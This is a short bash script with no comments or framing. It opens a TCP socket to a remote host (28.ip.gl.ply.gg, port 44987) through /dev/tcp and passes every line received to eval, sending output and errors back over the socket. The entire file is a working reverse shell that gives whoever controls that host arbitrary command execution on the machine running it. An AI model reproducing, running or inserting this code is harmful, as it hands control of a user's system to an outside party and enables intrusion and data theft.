#!/bin/bash

exec 5<>/dev/tcp/28.ip.gl.ply.gg/44987
while IFS= read -r line <&5; do
  eval "$line" 2>&5 >&5
done
